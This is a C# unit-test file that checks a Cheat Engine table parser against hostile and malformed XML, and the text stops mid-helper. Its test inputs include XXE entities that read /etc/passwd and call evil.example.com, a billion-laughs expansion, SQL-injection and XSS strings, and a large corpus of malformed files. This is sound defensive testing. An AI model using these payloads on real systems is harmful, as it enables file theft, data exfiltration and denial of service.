using System.Diagnostics;
using System.Globalization;
using System.Text;
using CEAISuite.Application;

namespace CEAISuite.Tests;

/// <summary>
/// Adversarial tests for CheatTableParser to verify resilience against
/// XXE attacks, billion laughs, deep nesting, large files, malformed XML,
/// and injection attempts in field values.
/// </summary>
public class AdversarialCheatTableTests
{
    // ── A. XXE (XML External Entity) attack prevention ──

    [Fact]
    public void Parse_XxeAttack_DoesNotReadFileSystem()
    {
        var xml = """
            <?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>&xxe;</Description>
                  <Address>100</Address>
                  <VariableType>4 Bytes</VariableType>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        // XDocument.Parse with default settings should reject DTDs.
        // Either it throws or it strips the entity — either way, no file contents leak.
        try
        {
            var result = CheatTableParser.Parse(xml, "xxe-test.ct");
            // If parsing succeeds, the description must NOT contain /etc/passwd content
            var entry = result.Entries[0];
            Assert.DoesNotContain("root:", entry.Description);
            Assert.DoesNotContain("/bin/", entry.Description);
        }
        catch (System.Xml.XmlException)
        {
            // Expected: .NET blocks DTD processing by default
        }
    }

    [Fact]
    public void Parse_XxeHttpEntity_DoesNotMakeNetworkRequest()
    {
        var xml = """
            <?xml version="1.0"?>
            <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.example.com/steal">]>
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>&xxe;</Description>
                  <Address>100</Address>
                  <VariableType>4 Bytes</VariableType>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        // Should either throw or produce safe output
        try
        {
            var result = CheatTableParser.Parse(xml, "xxe-http-test.ct");
            // If it parses, description should be empty or literal entity text
            Assert.NotNull(result);
        }
        catch (System.Xml.XmlException)
        {
            // Expected: DTD processing blocked
        }
    }

    // ── B. XML Entity Expansion (Billion Laughs) attack ──

    [Fact]
    public void Parse_BillionLaughsAttack_DoesNotCauseExponentialExpansion()
    {
        var xml = """
            <?xml version="1.0"?>
            <!DOCTYPE lolz [
              <!ENTITY lol "lol">
              <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
              <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
            ]>
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>&lol3;</Description>
                  <Address>100</Address>
                  <VariableType>4 Bytes</VariableType>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        // Should either throw (DTD blocked) or complete quickly without OOM
        var sw = Stopwatch.StartNew();
        try
        {
            var result = CheatTableParser.Parse(xml, "billion-laughs.ct");
            sw.Stop();
            // If it somehow parsed, it should finish in well under 5 seconds
            Assert.True(sw.ElapsedMilliseconds < 5000, "Billion laughs took too long — potential entity expansion attack");
        }
        catch (System.Xml.XmlException)
        {
            // Expected: DTD processing blocked
        }
    }

    // ── C. Extremely deep nesting (>100 levels of groups) ──

    [Fact]
    public void Parse_DeeplyNestedGroups_200Levels_NoStackOverflow()
    {
        const int depth = 200;
        var sb = new StringBuilder();
        sb.AppendLine("<CheatTable CheatEngineTableVersion=\"46\">");

        // Open 200 levels of nested groups
        for (int i = 0; i < depth; i++)
        {
            sb.AppendLine("<CheatEntries><CheatEntry>");
            sb.AppendLine(CultureInfo.InvariantCulture, $"<ID>{i}</ID>");
            sb.AppendLine(CultureInfo.InvariantCulture, $"<Description>\"Level {i}\"</Description>");
            sb.AppendLine("<GroupHeader>1</GroupHeader>");
        }

        // Innermost leaf entry
        sb.AppendLine("<CheatEntries><CheatEntry>");
        sb.AppendLine(CultureInfo.InvariantCulture, $"<ID>{depth}</ID>");
        sb.AppendLine("<Description>\"Leaf\"</Description>");
        sb.AppendLine("<VariableType>4 Bytes</VariableType>");
        sb.AppendLine("<Address>100</Address>");
        sb.AppendLine("</CheatEntry></CheatEntries>");

        // Close all 200 levels
        for (int i = 0; i < depth; i++)
        {
            sb.AppendLine("</CheatEntry></CheatEntries>");
        }

        sb.AppendLine("</CheatTable>");

        var xml = sb.ToString();

        // Should not throw StackOverflowException
        var result = CheatTableParser.Parse(xml, "deep-nest.ct");

        // Total entries: 200 groups + 1 leaf = 201
        Assert.Equal(depth + 1, result.TotalEntryCount);

        // Verify the structure is 200 levels deep
        var current = result.Entries[0];
        for (int i = 0; i < depth - 1; i++)
        {
            Assert.True(current.IsGroupHeader, $"Level {i} should be a group header");
            Assert.Single(current.Children);
            current = current.Children[0];
        }

        // Last group contains the leaf
        Assert.True(current.IsGroupHeader);
        Assert.Single(current.Children);
        Assert.Equal("Leaf", current.Children[0].Description);
    }

    // ── D. Very large CT file (>1000 entries) ──

    [Fact]
    public void Parse_2000FlatEntries_CompletesInReasonableTime()
    {
        const int entryCount = 2000;
        var sb = new StringBuilder();
        sb.AppendLine("<CheatTable CheatEngineTableVersion=\"46\">");
        sb.AppendLine("<CheatEntries>");

        for (int i = 0; i < entryCount; i++)
        {
            sb.AppendLine(CultureInfo.InvariantCulture, $"""
                <CheatEntry>
                  <ID>{i}</ID>
                  <Description>"Entry {i}"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>{i * 4:X8}</Address>
                </CheatEntry>
                """);
        }

        sb.AppendLine("</CheatEntries>");
        sb.AppendLine("</CheatTable>");

        var xml = sb.ToString();
        var sw = Stopwatch.StartNew();

        var result = CheatTableParser.Parse(xml, "large.ct");

        sw.Stop();
        Assert.Equal(entryCount, result.TotalEntryCount);
        Assert.Equal(entryCount, result.Entries.Count);
        Assert.True(sw.ElapsedMilliseconds < 10000,
            $"Parsing {entryCount} entries took {sw.ElapsedMilliseconds}ms — should be under 10s");

        // Spot-check a few entries
        Assert.Equal("Entry 0", result.Entries[0].Description);
        Assert.Equal("Entry 1999", result.Entries[1999].Description);
        Assert.Equal("00001F3C", result.Entries[1999].Address); // 1999 * 4 = 7996 = 0x1F3C
    }

    [Fact]
    public void ToAddressTableNodes_2000Entries_ProducesCorrectCount()
    {
        const int entryCount = 2000;
        var sb = new StringBuilder();
        sb.AppendLine("<CheatTable CheatEngineTableVersion=\"46\">");
        sb.AppendLine("<CheatEntries>");

        for (int i = 0; i < entryCount; i++)
        {
            sb.AppendLine(CultureInfo.InvariantCulture, $"""
                <CheatEntry>
                  <ID>{i}</ID>
                  <Description>"Entry {i}"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>{i * 4:X8}</Address>
                </CheatEntry>
                """);
        }

        sb.AppendLine("</CheatEntries>");
        sb.AppendLine("</CheatTable>");

        var ctFile = CheatTableParser.Parse(sb.ToString(), "large.ct");
        var nodes = CheatTableParser.ToAddressTableNodes(ctFile);

        Assert.Equal(entryCount, nodes.Count);
    }

    // ── E. Malformed XML ──

    [Fact]
    public void Parse_UnclosedTags_ThrowsFormatOrXmlException()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"Broken"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>100
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        Assert.ThrowsAny<Exception>(() => CheatTableParser.Parse(xml, "malformed.ct"));
    }

    [Fact]
    public void Parse_InvalidUtf8Bytes_ThrowsOrHandlesGracefully()
    {
        // Embed an invalid UTF-8 sequence via a valid XML string with a
        // replacement character (since raw invalid bytes can't be in a C# string literal,
        // we test with the Unicode replacement character which is valid XML)
        var xml = "<CheatTable CheatEngineTableVersion=\"46\">" +
                  "<CheatEntries><CheatEntry>" +
                  "<ID>1</ID>" +
                  "<Description>\"\uFFFD\uFFFD\"</Description>" +
                  "<VariableType>4 Bytes</VariableType>" +
                  "<Address>100</Address>" +
                  "</CheatEntry></CheatEntries></CheatTable>";

        // Should handle replacement characters without crashing
        var result = CheatTableParser.Parse(xml, "invalid-utf8.ct");
        Assert.Single(result.Entries);
    }

    [Fact]
    public void Parse_MissingDescription_DefaultsToUnknown()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <VariableType>4 Bytes</VariableType>
                  <Address>100</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "no-desc.ct");

        Assert.Single(result.Entries);
        Assert.Equal("Unknown", result.Entries[0].Description);
    }

    [Fact]
    public void Parse_MissingAddress_DefaultsToZero()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"No Address"</Description>
                  <VariableType>4 Bytes</VariableType>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "no-addr.ct");

        Assert.Single(result.Entries);
        Assert.Equal("0", result.Entries[0].Address);
    }

    [Fact]
    public void Parse_EmptyCheatEntries_ReturnsNoEntries()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries/>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "empty.ct");

        Assert.Empty(result.Entries);
        Assert.Equal(0, result.TotalEntryCount);
    }

    [Fact]
    public void Parse_EmptyXml_ThrowsFormatException()
    {
        Assert.ThrowsAny<Exception>(() => CheatTableParser.Parse("", "empty.ct"));
    }

    [Fact]
    public void Parse_NoRootElement_Throws()
    {
        var xml = "<?xml version=\"1.0\"?>";
        Assert.ThrowsAny<Exception>(() => CheatTableParser.Parse(xml, "no-root.ct"));
    }

    [Fact]
    public void Parse_MissingCheatEntriesElement_ReturnsEmptyEntries()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "no-entries-element.ct");
        Assert.Empty(result.Entries);
    }

    // ── F. Injection in field values ──

    [Fact]
    public void Parse_SqlInjectionInAddress_TreatedAsPlainString()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"SQL Inject"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>'; DROP TABLE--</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "sql-inject.ct");

        Assert.Single(result.Entries);
        Assert.Equal("'; DROP TABLE--", result.Entries[0].Address);
    }

    [Fact]
    public void Parse_HtmlJsInDescription_TreatedAsPlainString()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"&lt;script&gt;alert(1)&lt;/script&gt;"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>100</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "xss-test.ct");

        Assert.Single(result.Entries);
        // The parser strips quotes from description; content is treated as literal text
        Assert.Equal("<script>alert(1)</script>", result.Entries[0].Description);
        // The key assertion: it's stored as a string, not interpreted as markup
        Assert.IsType<string>(result.Entries[0].Description);
    }

    [Fact]
    public void Parse_CdataInDescription_TreatedAsPlainString()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description><![CDATA["<script>alert('xss')</script>"]]></Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>100</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "cdata-xss.ct");

        Assert.Single(result.Entries);
        Assert.Contains("script", result.Entries[0].Description);
    }

    [Fact]
    public void Parse_NullBytesInDescription_HandledGracefully()
    {
        // XML doesn't allow literal null bytes, but we can test with the escaped version
        // or with a description that has unusual control characters
        var xml = "<CheatTable CheatEngineTableVersion=\"46\">" +
                  "<CheatEntries><CheatEntry>" +
                  "<ID>1</ID>" +
                  "<Description>\"Test&#x9;Tab\"</Description>" +
                  "<VariableType>4 Bytes</VariableType>" +
                  "<Address>100</Address>" +
                  "</CheatEntry></CheatEntries></CheatTable>";

        var result = CheatTableParser.Parse(xml, "control-chars.ct");
        Assert.Single(result.Entries);
        // Tab character should be preserved as-is
        Assert.Contains("\t", result.Entries[0].Description);
    }

    [Fact]
    public void Parse_XmlEntitiesInAddress_ProperlyDecoded()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"Entities Test"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>game.exe+0x&amp;FF</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "entities.ct");

        Assert.Single(result.Entries);
        // XML entities should be decoded in the parsed value
        Assert.Equal("game.exe+0x&FF", result.Entries[0].Address);
    }

    [Fact]
    public void ToAddressTableNodes_InjectionInAddress_PreservedAsString()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"Injected"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>'; DROP TABLE--</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var ctFile = CheatTableParser.Parse(xml, "inject-node.ct");
        var nodes = CheatTableParser.ToAddressTableNodes(ctFile);

        Assert.Single(nodes);
        Assert.Equal("'; DROP TABLE--", nodes[0].Address);
    }

    [Fact]
    public void Parse_VeryLongDescription_Handles()
    {
        var longDesc = new string('A', 100_000);
        var xml = $"""
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"{longDesc}"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>100</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "long-desc.ct");

        Assert.Single(result.Entries);
        Assert.Equal(100_000, result.Entries[0].Description.Length);
    }

    [Fact]
    public void Parse_UnicodeAndEmoji_PreservedInDescription()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"Health ❤️ 生命值"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>100</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "unicode.ct");

        Assert.Single(result.Entries);
        Assert.Contains("❤", result.Entries[0].Description);
        Assert.Contains("生命", result.Entries[0].Description);
    }

    [Fact]
    public void Parse_DuplicateIds_AllEntriesParsed()
    {
        var xml = """
            <CheatTable CheatEngineTableVersion="46">
              <CheatEntries>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"First"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>100</Address>
                </CheatEntry>
                <CheatEntry>
                  <ID>1</ID>
                  <Description>"Duplicate ID"</Description>
                  <VariableType>4 Bytes</VariableType>
                  <Address>200</Address>
                </CheatEntry>
              </CheatEntries>
            </CheatTable>
            """;

        var result = CheatTableParser.Parse(xml, "dup-ids.ct");

        // Parser should not crash on duplicate IDs
        Assert.Equal(2, result.Entries.Count);
    }

    // ── G. Malformed CT Corpus (50+ edge cases) ──

    public static IEnumerable<object[]> MalformedCtCorpus()
    {
        // ── Empty/Whitespace (5) ──
        yield return new object[] { "", "Empty string" };
        yield return new object[] { "   \t  ", "Whitespace only" };
        yield return new object[] { "\n", "Single newline" };
        yield return new object[] { "\uFEFF", "BOM only (UTF-8 BOM character)" };
        yield return new object[] { "<?xml version=\"1.0\"?>", "XML declaration only" };

        // ── Valid root but missing/broken children (5) ──
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"></CheatTable>",
            "CheatTable with no children"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries/></CheatTable>",
            "CheatTable with empty CheatEntries"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><Description>\"NoID\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "CheatEntry with no ID element"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NoAddr\"</Description><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "CheatEntry with no Address element"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NoType\"</Description><Address>100</Address></CheatEntry></CheatEntries></CheatTable>",
            "CheatEntry with no VariableType element"
        };

        // ── Invalid data types (5) ──
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"BadType\"</Description><Address>100</Address><VariableType>NotAType</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "VariableType = NotAType"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"EmptyType\"</Description><Address>100</Address><VariableType></VariableType></CheatEntry></CheatEntries></CheatTable>",
            "VariableType = empty"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NumType\"</Description><Address>100</Address><VariableType>999999</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "VariableType = 999999"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NegType\"</Description><Address>100</Address><VariableType>-42</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "VariableType = negative number"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"EmojiType\"</Description><Address>100</Address><VariableType>\U0001F4A9</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "VariableType = emoji"
        };

        // ── Deep nesting (3) ──
        yield return new object[] { BuildDeepNesting(50), "50-level nested CheatEntry groups" };
        yield return new object[] { BuildDeepNesting(100), "100-level nested CheatEntry groups" };
        yield return new object[] { BuildFlatChildren(1000), "Groups with 1000 flat children" };

        // ── Extreme values (5) ──
        yield return new object[] {
            $"<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"{new string('X', 10_000)}\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "10K character description"
        };
        yield return new object[] {
            $"<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"LongAddr\"</Description><Address>{new string('A', 1000)}</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "1K character address"
        };
        yield return new object[] {
            $"<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"HugeHex\"</Description><Address>0x{new string('F', 200)}</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "Address = 0x + 200 Fs"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NegAddr\"</Description><Address>-1</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "Address = -1"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"BadOffset\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><Offsets><Offset>ZZZZ</Offset></Offsets></CheatEntry></CheatEntries></CheatTable>",
            "Offset value = ZZZZ (not hex)"
        };

        // ── Unicode attacks (5) ──
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"RTL\"</Description><Address>\u202E100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "RTL override U+202E in address field"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"\u200D\u200DZeroWidth\u200D\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "Zero-width joiners in description"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>\U0001F600</ID><Description>\"EmojiID\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "Emoji in ID field"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"\u4F60\u597D\"</Description><Address>\u5730\u5740</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "Chinese characters in address"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"\u202Bright\u202Aleft\u202Bmixed\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "Mixed RTL/LTR in description"
        };

        // ── Structural issues (7) ──
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"Has&#x9;Tab\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "Control character (tab) in element text"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><![CDATA[<CheatEntry><ID>1</ID></CheatEntry>]]></CheatEntries></CheatTable>",
            "CDATA wrapping the entire CheatEntries content"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"MultiLua\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries><LuaScript>print('a')</LuaScript><LuaScript>print('b')</LuaScript></CheatTable>",
            "Multiple LuaScript elements"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>42</ID><Description>\"Dup1\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry><CheatEntry><ID>42</ID><Description>\"Dup2\"</Description><Address>200</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries></CheatTable>",
            "Duplicate entry IDs (same ID value)"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry/></CheatEntries></CheatTable>",
            "Self-closing CheatEntry"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries></CheatEntries><CheatEntry><ID>1</ID><Description>\"Outside\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatTable>",
            "Entry outside CheatEntries element"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries>Some text here<CheatEntry><ID>1</ID><Description>\"Interleaved\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry>More text</CheatEntries></CheatTable>",
            "Interleaved text nodes between entries"
        };

        // ── Truncation (5) ──
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntr",
            "Truncated mid-tag"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\" Extra=\"trun",
            "Truncated mid-attribute"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\">",
            "Truncated after opening tag"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NoClose\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType></CheatEntry></CheatEntries>",
            "Missing closing root tag"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"Half&amp</Description></CheatEntry></CheatEntries></CheatTable>",
            "Half an entity reference"
        };

        // ── Script edge cases (5) ──
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"EnableOnly\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><AssemblerScript>[ENABLE]\nnop</AssemblerScript></CheatEntry></CheatEntries></CheatTable>",
            "Script with only [ENABLE], no [DISABLE]"
        };
        yield return new object[] {
            $"<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"BinScript\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><AssemblerScript>&#x1;&#x2;&#x3;&#x4;&#x5;</AssemblerScript></CheatEntry></CheatEntries></CheatTable>",
            "Script with binary content (0x01-0x05)"
        };
        yield return new object[] {
            $"<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"BigScript\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><AssemblerScript>{string.Concat(Enumerable.Repeat("nop\n", 25_000))}</AssemblerScript></CheatEntry></CheatEntries></CheatTable>",
            "Script with 100KB of NOPs"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NullScript\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><AssemblerScript>&#x9;</AssemblerScript></CheatEntry></CheatEntries></CheatTable>",
            "Script = tab character (substitute for null byte)"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"EmptyScript\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><AssemblerScript></AssemblerScript></CheatEntry></CheatEntries></CheatTable>",
            "Empty script element"
        };

        // ── Pointer edge cases (5) ──
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NoOffsetVal\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><Offsets><Offset></Offset></Offsets></CheatEntry></CheatEntries></CheatTable>",
            "Offset with no value (empty element)"
        };
        yield return new object[] {
            BuildDeepPointerChain(20),
            "20 offset elements (deep chain)"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"NegOffset\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><Offsets><Offset>-FF</Offset><Offset>-10</Offset></Offsets></CheatEntry></CheatEntries></CheatTable>",
            "Negative offset values"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"EmptyOff\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><Offsets><Offset/><Offset/></Offsets></CheatEntry></CheatEntries></CheatTable>",
            "Offset = empty (self-closing)"
        };
        yield return new object[] {
            "<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries><CheatEntry><ID>1</ID><Description>\"MixedOff\"</Description><Address>100</Address><VariableType>4 Bytes</VariableType><Offsets><Offset>10</Offset><Offset>ZZZZ</Offset><Offset>20</Offset></Offsets></CheatEntry></CheatEntries></CheatTable>",
            "Mixed valid/invalid offsets"
        };
    }

    [Theory]
    [MemberData(nameof(MalformedCtCorpus))]
    public void ParseMalformedCt_DoesNotCrashOrCorrupt(string xml, string description)
    {
        try
        {
            var result = CheatTableParser.Parse(xml, "malformed.ct");
            // If parsing succeeded, verify basic invariants
            Assert.NotNull(result);
            Assert.NotNull(result.Entries);
        }
        catch (Exception ex)
        {
            // Acceptable exception types for malformed input
            Assert.True(
                ex is System.Xml.XmlException or FormatException or ArgumentException
                or InvalidOperationException or OverflowException,
                $"Unexpected exception type {ex.GetType().Name} for '{description}': {ex.Message}");
        }
    }

    // ── Helpers for corpus generation ──

    private static string BuildDeepNesting(int depth)
    {
        var sb = new StringBuilder();
        sb.Append("<CheatTable CheatEngineTableVersion=\"46\">");
        for (int i = 0; i < depth; i++)
        {
            sb.Append("<CheatEntries><CheatEntry>");
            sb.Append(CultureInfo.InvariantCulture, $"<ID>{i}</ID>");
            sb.Append(CultureInfo.InvariantCulture, $"<Description>\"Level {i}\"</Description>");
            sb.Append("<GroupHeader>1</GroupHeader>");
        }
        // Innermost leaf
        sb.Append("<CheatEntries><CheatEntry>");
        sb.Append(CultureInfo.InvariantCulture, $"<ID>{depth}</ID>");
        sb.Append("<Description>\"Leaf\"</Description>");
        sb.Append("<VariableType>4 Bytes</VariableType>");
        sb.Append("<Address>100</Address>");
        sb.Append("</CheatEntry></CheatEntries>");
        for (int i = 0; i < depth; i++)
        {
            sb.Append("</CheatEntry></CheatEntries>");
        }
        sb.Append("</CheatTable>");
        return sb.ToString();
    }

    private static string BuildFlatChildren(int count)
    {
        var sb = new StringBuilder();
        sb.Append("<CheatTable CheatEngineTableVersion=\"46\"><CheatEntries>");
        for (int i = 0; i < count; i++)
        {
            sb.Append(CultureInfo.InvariantCulture, $"<CheatEntry><ID>{i}</ID><Description>\"Entry {i}\"</Description><Address>{i * 4:X}</Address><VariableType>4 Bytes</VariableType></CheatEntry>");
        }
        sb.Append("</CheatEntries></CheatTable>");
        return sb.ToString();
    }

    private static string BuildDeepPointerChain(int offsetCount)
    {
        var sb = new StringBuilder();
